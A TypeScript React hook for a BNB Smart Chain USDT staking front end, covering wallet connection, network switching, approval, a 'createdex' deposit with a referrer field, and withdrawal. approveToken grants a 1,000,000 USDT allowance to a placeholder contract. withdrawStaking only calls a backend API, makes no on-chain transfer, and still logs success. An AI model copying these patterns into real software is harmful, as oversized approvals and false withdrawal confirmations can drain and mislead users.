'use client'

import { useState, useEffect, useCallback } from 'react'
import Web3 from 'web3'

// 扩展Window类型
declare global {
  interface Window {
    ethereum?: any
    web3?: any
  }
}

// 合约配置
const CONTRACT_CONFIG = {
  // BSC主网配置
  CHAIN_ID: 56,
  RPC_URL: 'https://bsc-dataseed.binance.org',
  
  // 合约地址 (需要根据实际部署更新)
  MAIN_CONTRACT: '0x...', // 主业务合约地址
  USDT_CONTRACT: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT合约地址
  
  // Gas配置
  GAS_PRICE: '3', // 3 gwei
  GAS_LIMIT: 60000,
}

// USDT合约ABI (简化版)
const USDT_ABI = [
  {
    "constant": false,
    "inputs": [
      {"name": "_spender", "type": "address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"name": "", "type": "bool"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {"name": "_owner", "type": "address"},
      {"name": "_spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  }
]

// 主合约ABI (简化版)
const MAIN_CONTRACT_ABI = [
  {
    "constant": false,
    "inputs": [
      {"name": "amount", "type": "uint256"},
      {"name": "referrer", "type": "uint256"}
    ],
    "name": "createdex",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "withdrawid", "type": "uint256"},
      {"name": "currency_id", "type": "uint256"},
      {"name": "amount", "type": "uint256"},
      {"name": "time", "type": "uint256"},
      {"name": "sign", "type": "string"}
    ],
    "name": "withdraw",
    "outputs": [],
    "type": "function"
  }
]

export function useStaking() {
  const [web3, setWeb3] = useState<Web3 | null>(null)
  const [isAuthorized, setIsAuthorized] = useState(false)
  const [chainId, setChainId] = useState<number>(0)
  const [isInitialized, setIsInitialized] = useState(false)

  // 初始化Web3
  const initializeWeb3 = useCallback(async () => {
    try {
      console.log('🔄 开始初始化Web3...')
      
      let web3Instance: Web3
      
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        web3Instance = new Web3((window as any).ethereum)
        
        try {
          // 请求用户授权 - 使用新的方法
          await (window as any).ethereum.request({ method: 'eth_requestAccounts' })
          console.log('✅ 用户授权成功')
        } catch (error) {
          console.warn('⚠️ 用户拒绝授权，使用只读模式')
          throw new Error('用户拒绝钱包授权')
        }
      } else if (typeof window !== 'undefined' && (window as any).web3) {
        web3Instance = new Web3((window as any).web3.currentProvider)
        console.log('✅ 检测到注入的web3')
      } else {
        // 使用BSC RPC节点
        web3Instance = new Web3(new Web3.providers.HttpProvider(CONTRACT_CONFIG.RPC_URL))
        console.log('✅ 使用BSC RPC节点')
      }
      
      setWeb3(web3Instance)
      
      // 获取链ID
      const currentChainId = await web3Instance.eth.getChainId()
      setChainId(Number(currentChainId))
      console.log('🔗 当前链ID:', currentChainId)
      
      setIsInitialized(true)
      return web3Instance
      
    } catch (error) {
      console.error('❌ Web3初始化失败:', error)
      throw error
    }
  }, [])

  // 检查和切换网络
  const switchToBSC = useCallback(async () => {
    if (!(window as any).ethereum) {
      throw new Error('请安装钱包插件')
    }

    try {
      await (window as any).ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x' + CONTRACT_CONFIG.CHAIN_ID.toString(16) }],
      })
    } catch (error: any) {
      if (error.code === 4902) {
        // 网络不存在，添加BSC网络
        await (window as any).ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x' + CONTRACT_CONFIG.CHAIN_ID.toString(16),
            chainName: 'Binance Smart Chain',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18
            },
            rpcUrls: [CONTRACT_CONFIG.RPC_URL],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        })
      } else {
        throw error
      }
    }
  }, [])

  // 检查授权状态
  const checkAuthorization = useCallback(async (userAddress: string) => {
    if (!web3 || !userAddress) return false
    
    try {
      const usdtContract = new web3.eth.Contract(USDT_ABI as any, CONTRACT_CONFIG.USDT_CONTRACT)
      const result = await usdtContract.methods.allowance(userAddress, CONTRACT_CONFIG.MAIN_CONTRACT).call()
      const allowance = result as string
      
      // 检查授权额度是否大于0
      const hasAllowance = BigInt(allowance) > BigInt(0)
      setIsAuthorized(hasAllowance)
      return hasAllowance
    } catch (error) {
      console.error('❌ 检查授权状态失败:', error)
      return false
    }
  }, [web3])

  // 授权USDT
  const approveToken = useCallback(async () => {
    if (!web3 || !(window as any).ethereum) {
      throw new Error('Web3未初始化或钱包未连接')
    }

    // 确保在正确的网络上
    if (chainId !== CONTRACT_CONFIG.CHAIN_ID) {
      await switchToBSC()
    }

    try {
      const accounts = await web3.eth.getAccounts()
      if (!accounts[0]) {
        throw new Error('请先连接钱包')
      }

      const usdtContract = new web3.eth.Contract(USDT_ABI as any, CONTRACT_CONFIG.USDT_CONTRACT)
      
      // 授权大额度 (1,000,000 USDT)
      const approveAmount = web3.utils.toWei('1000000', 'ether')
      const gasPrice = web3.utils.toWei(CONTRACT_CONFIG.GAS_PRICE, 'gwei')
      
      console.log('🔑 开始授权USDT...')
      
      const result = await usdtContract.methods.approve(CONTRACT_CONFIG.MAIN_CONTRACT, approveAmount).send({
        from: accounts[0],
        gasPrice: gasPrice,
        gas: CONTRACT_CONFIG.GAS_LIMIT.toString()
      })
      
      console.log('✅ 授权成功:', result.transactionHash)
      setIsAuthorized(true)
      return result

    } catch (error) {
      console.error('❌ 授权失败:', error)
      throw error
    }
  }, [web3, chainId, switchToBSC])

  // 参与质押
  const participateStaking = useCallback(async (amount: string) => {
    if (!web3 || !(window as any).ethereum) {
      throw new Error('Web3未初始化或钱包未连接')
    }

    // 确保在正确的网络上
    if (chainId !== CONTRACT_CONFIG.CHAIN_ID) {
      await switchToBSC()
    }

    try {
      const accounts = await web3.eth.getAccounts()
      if (!accounts[0]) {
        throw new Error('请先连接钱包')
      }

      const mainContract = new web3.eth.Contract(MAIN_CONTRACT_ABI as any, CONTRACT_CONFIG.MAIN_CONTRACT)
      const investAmount = web3.utils.toWei(amount, 'ether')
      
      console.log('💰 开始质押:', amount, 'USDT')
      
      const result = await mainContract.methods.createdex(investAmount, 0).send({
        from: accounts[0]
      })
      
      console.log('✅ 质押成功:', result.transactionHash)
      
      // 等待交易确认
      await waitForTransaction(result.transactionHash)
      
      return result

    } catch (error) {
      console.error('❌ 质押失败:', error)
      throw error
    }
  }, [web3, chainId, switchToBSC])

  // 提取资金
  const withdrawStaking = useCallback(async (amount: string) => {
    if (!web3) {
      throw new Error('Web3未初始化')
    }

    try {
      const accounts = await web3.eth.getAccounts()
      if (!accounts[0]) {
        throw new Error('请先连接钱包')
      }

      // 首先调用API获取提取签名
      const response = await fetch('/api/withdraw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: amount,
          address: accounts[0],
          currency_id: 13 // USDT
        })
      })

      if (!response.ok) {
        throw new Error('获取提取签名失败')
      }

      const withdrawData = await response.json()
      
      console.log('💸 开始提取:', amount, 'USDT')
      
      // 这里可以直接更新后台记录，无需调用合约
      // 因为原代码中合约调用部分被注释了
      
      console.log('✅ 提取成功')
      return withdrawData

    } catch (error) {
      console.error('❌ 提取失败:', error)
      throw error
    }
  }, [web3])

  // 等待交易确认
  const waitForTransaction = useCallback(async (txHash: string) => {
    if (!web3) return
    
    let count = 0
    const maxRetries = 10
    
    return new Promise((resolve, reject) => {
      const checkTransaction = async () => {
        try {
          const receipt = await web3.eth.getTransactionReceipt(txHash)
          if (receipt && receipt.transactionIndex !== undefined) {
            console.log('✅ 交易确认成功:', receipt)
            resolve(receipt)
          } else {
            count++
            if (count >= maxRetries) {
              reject(new Error('交易确认超时'))
            } else {
              setTimeout(checkTransaction, 2000) // 2秒后重试
            }
          }
        } catch (error) {
          count++
          if (count >= maxRetries) {
            reject(error)
          } else {
            setTimeout(checkTransaction, 2000)
          }
        }
      }
      
      checkTransaction()
    })
  }, [web3])

  // 获取用户信息
  const getUserInfo = useCallback(async (userAddress: string) => {
    try {
      const response = await fetch(`/api/user/info?address=${userAddress}`)
      if (!response.ok) {
        throw new Error('获取用户信息失败')
      }
      return await response.json()
    } catch (error) {
      console.error('❌ 获取用户信息失败:', error)
      throw error
    }
  }, [])

  // 获取钱包余额
  const getWalletBalance = useCallback(async (userAddress: string) => {
    if (!web3 || !userAddress) return 0
    
    try {
      const usdtContract = new web3.eth.Contract(USDT_ABI as any, CONTRACT_CONFIG.USDT_CONTRACT)
      const result = await usdtContract.methods.balanceOf(userAddress).call()
      const balance = result as string
      return parseFloat(web3.utils.fromWei(balance, 'ether'))
    } catch (error) {
      console.error('❌ 获取钱包余额失败:', error)
      return 0
    }
  }, [web3])

  // 获取Gas价格
  const getGasPrice = useCallback(async () => {
    if (!web3) return 0
    
    try {
      const result = await web3.eth.getGasPrice()
      const gasPrice = result as string
      return parseFloat(web3.utils.fromWei(gasPrice, 'ether'))
    } catch (error) {
      console.error('❌ 获取Gas价格失败:', error)
      return 0
    }
  }, [web3])

  // 初始化
  useEffect(() => {
    initializeWeb3().catch(console.error)
  }, [initializeWeb3])

  return {
    web3,
    isAuthorized,
    isInitialized,
    chainId,
    initializeWeb3,
    switchToBSC,
    checkAuthorization,
    approveToken,
    participateStaking,
    withdrawStaking,
    getUserInfo,
    getWalletBalance,
    getGasPrice,
    waitForTransaction
  }
} 